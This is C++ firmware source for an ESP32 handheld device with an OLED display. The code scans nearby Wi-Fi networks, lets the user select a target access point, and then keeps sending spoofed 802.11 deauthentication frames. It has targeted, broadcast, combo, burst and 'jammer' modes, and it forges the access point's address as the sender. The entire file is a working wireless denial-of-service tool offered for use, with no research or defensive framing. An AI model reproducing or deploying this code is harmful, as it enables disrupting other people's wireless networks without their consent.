#include "cstdio"
#include "cstring"
#include "esp_wifi.h"
#include "stdint.h"

#include "tool_state.h"
#include "display_common.h"
#include "console_common.h"
#include "wifi_common.h"
#include "wifi_deauth.h"

static void show_deauth_progress_frame(const char *text, uint32_t sent_count, uint8_t phase)
{
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);

    draw_centered_text(text, 10, 1, false, false);

    const int bar_x = 14;
    const int bar_y = 32;
    const int bar_w = 100;
    const int bar_h = 10;

    display.drawRect(bar_x, bar_y, bar_w, bar_h, SSD1306_WHITE);
    int fill_width = ((phase + 1) * (bar_w - 2)) / 3;
    display.fillRect(bar_x + 1, bar_y + 1, fill_width, bar_h - 2, SSD1306_WHITE);

    char count_text[24];
    snprintf(count_text, sizeof(count_text), "%lu sent", static_cast<unsigned long>(sent_count));
    draw_centered_text(count_text, 48, 1, false, false);

    for (uint8_t i = 0; i < 3; i++)
    {
        int x = 52 + (i * 12);
        if (((phase + i) % 3) == 0)
        {
            display.fillCircle(x, 58, 2, SSD1306_WHITE);
        }
        else
        {
            display.drawCircle(x, 58, 2, SSD1306_WHITE);
        }
    }

    display.display();
}

static bool parse_bssid(const char *bssid_str, uint8_t out[6])
{
    if (bssid_str == nullptr)
    {
        return false;
    }

    unsigned int b0, b1, b2, b3, b4, b5;
    int parsed = sscanf(
        bssid_str,
        "%02X:%02X:%02X:%02X:%02X:%02X",
        &b0, &b1, &b2, &b3, &b4, &b5);

    if (parsed != 6)
    {
        return false;
    }

    out[0] = static_cast<uint8_t>(b0);
    out[1] = static_cast<uint8_t>(b1);
    out[2] = static_cast<uint8_t>(b2);
    out[3] = static_cast<uint8_t>(b3);
    out[4] = static_cast<uint8_t>(b4);
    out[5] = static_cast<uint8_t>(b5);
    return true;
}

static int select_target_network()
{
    if (scanned_network_count <= 0)
    {
        return -1;
    }

    int selected_option = 0;
    const int items_per_page = 4;
    clear_button_state();

    while (true)
    {
        if (is_movefd_pressed)
        {
            is_movefd_pressed = false;
            selected_option++;
            if (selected_option >= scanned_network_count)
            {
                selected_option = 0;
            }
        }

        if (is_movebd_pressed)
        {
            is_movebd_pressed = false;
            selected_option--;
            if (selected_option < 0)
            {
                selected_option = scanned_network_count - 1;
            }
        }

        if (is_select_pressed)
        {
            is_select_pressed = false;
            clear_button_state();
            return selected_option;
        }

        if (is_home_pressed)
        {
            is_home_pressed = false;
            clear_button_state();
            return -1;
        }

        display.clearDisplay();
        display.setTextColor(SSD1306_WHITE);
        display.setTextSize(1);
        display.setCursor(2, 2);
        display.print("TARGET AP");
        display.drawLine(0, 10, 127, 10, SSD1306_WHITE);

        int page = selected_option / items_per_page;
        int start = page * items_per_page;
        int end = start + items_per_page;
        if (end > scanned_network_count)
        {
            end = scanned_network_count;
        }

        int y = 14;
        for (int i = start; i < end; i++)
        {
            if (i == selected_option)
            {
                display.fillRect(0, y, 125, 10, SSD1306_WHITE);
                display.setTextColor(SSD1306_BLACK);
            }
            else
            {
                display.setTextColor(SSD1306_WHITE);
            }

            display.setCursor(2, y);
            String ssid = networks[i].ssid.length() > 0 ? networks[i].ssid : "<hidden>";
            if (ssid.length() > 12)
            {
                ssid = ssid.substring(0, 12);
            }
            display.print(ssid);
            display.setCursor(82, y);
            display.print(networks[i].rssi);
            y += 11;
        }

        int total_pages = (scanned_network_count + items_per_page - 1) / items_per_page;
        int bar_height = 64 / total_pages;
        int bar_y = page * bar_height;
        display.fillRect(125, bar_y, 3, bar_height, SSD1306_WHITE);

        display.display();
        delay(30);
    }
}

bool _send_deauth_frame_to_ap(uint8_t target_addr[])
{
    uint8_t packet[26];
    memcpy(packet, deauthPacket, 26);
    
    // Source address (the AP we're impersonating)
    memcpy(&packet[10], target_addr, 6);
    
    // BSSID (also the AP address)
    memcpy(&packet[16], target_addr, 6);
    
    // Send the frame
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    return true;
}

bool _broadcast_send_deauth_frame(){
    uint8_t packet[26];
    memcpy(packet, deauthPacket, 26);
    
    // Source address (the AP we're impersonating)
    memcpy(&packet[10], broadcastAddress, 6);
    
    // BSSID (also the AP address)
    memcpy(&packet[16], broadcastAddress, 6);
    
    // Send the frame
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    return true;
}

void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bool safe_mode, bool jammer_mode)
{
    init_wifi();
    scan_wifi("Scanning targets", random_mac, safe_mode);

    if (scanned_network_count <= 0)
    {
        show_task_progress_frame("No target AP found", 100, 0, false);
        delay(450);
        disable_wifi();
        return;
    }

    uint8_t phase = 0;
    uint32_t sent_count = 0;
    uint8_t target_addr[6];
    uint8_t target_count = static_cast<uint8_t>(scanned_network_count > MAX_NETWORKS ? MAX_NETWORKS : scanned_network_count);
    int start_target_index = 0;
    uint8_t repeats_per_target = burst_mode ? 3 : 1;

    uint16_t send_delay = 100;
    
    if (jammer_mode)
    {
        send_delay = 10;
        repeats_per_target += 5;
    }

    if (safe_mode && repeats_per_target > 1)
    {
        send_delay = 75;
        repeats_per_target = 1;
    }
    
    esp_wifi_set_promiscuous(true);

    if (strcmp(attack_type, "targeted_deauth") == 0)
    {
        
        int selected_target = select_target_network();
        if (selected_target < 0)
        {
            show_task_progress_frame("Target select canceled", 100, phase, false);
            delay(350);
            disable_wifi();
            return;
        }

        start_target_index = selected_target;
        target_count = 1;
    }

    while (true)
    {
        if (is_menu_pressed || is_home_pressed || is_select_pressed || is_movefd_pressed || is_movebd_pressed)
        {
            break;
        }

        for (int idx = start_target_index; idx < (start_target_index + target_count); idx++)
        {
            if (!parse_bssid(networks[idx].bssid, target_addr))
            {
                continue;
            }

            if (networks[idx].channel > 0)
            {
                esp_wifi_set_channel(networks[idx].channel, WIFI_SECOND_CHAN_NONE);
                delay(1);  // Let radio settle on new channel
            }

            for (uint8_t rep = 0; rep < repeats_per_target; rep++)
            {
                if (strcmp(attack_type, "targeted_deauth") == 0)
                {
                    if (_send_deauth_frame_to_ap(target_addr))
                    {
                        sent_count++;
                    }
                }
                else if (strcmp(attack_type, "combo_deauth") == 0)
                {
                    if (_send_deauth_frame_to_ap(target_addr))
                    {
                        sent_count++;
                    }
                    if (_broadcast_send_deauth_frame())
                    {
                        sent_count++;
                    }
                }
                else
                {
                    if (_broadcast_send_deauth_frame())
                    {
                        sent_count++;
                    }
                }
            }
        }

        phase = (phase + 1) % 3;
        show_deauth_progress_frame("Sending DE-AUTH Frames", sent_count, phase);
        delay(send_delay);
    }

    if (strcmp(attack_type, "targeted_deauth") == 0)
    {
        show_task_progress_frame("Targeted DE-AUTH stopped", 100, phase, false);
    }
    else
    {
        show_task_progress_frame("Broadcast DE-AUTH stopped", 100, phase, false);
    }

    delay(250);

    clear_button_state();

    esp_wifi_set_promiscuous(false);

    disable_wifi();
}